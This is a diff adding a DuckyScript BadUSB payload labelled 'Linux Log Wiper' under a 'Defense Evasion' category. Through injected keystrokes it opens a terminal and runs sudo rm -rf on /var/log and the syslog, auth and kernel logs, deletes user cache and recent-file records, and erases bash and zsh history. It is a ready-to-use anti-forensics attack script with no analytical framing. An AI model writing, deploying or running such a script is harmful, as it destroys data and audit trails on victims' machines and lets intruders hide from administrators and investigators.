@@ -1,0 +1,53 @@
+REM Title: Linux Log Wiper
+REM Author: BadUSB Library
+REM Description: Wipes system and user logs
+REM Target: Linux
+REM Category: Defense Evasion
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Clear system logs
+STRING sudo rm -rf /var/log/*
+ENTER
+DELAY 2000
+
+STRING sudo rm -rf /var/log/syslog*
+ENTER
+DELAY 2000
+
+STRING sudo rm -rf /var/log/auth.log*
+ENTER
+DELAY 2000
+
+STRING sudo rm -rf /var/log/kern.log*
+ENTER
+DELAY 2000
+
+REM Clear user logs
+STRING rm -rf ~/.cache/*
+ENTER
+DELAY 2000
+
+STRING rm -rf ~/.local/share/recently-used.xbel
+ENTER
+DELAY 2000
+
+REM Clear bash history
+STRING history -c
+ENTER
+DELAY 1000
+
+STRING rm -f ~/.bash_history
+ENTER
+DELAY 1000
+
+STRING rm -f ~/.zsh_history
+ENTER
+DELAY 1000
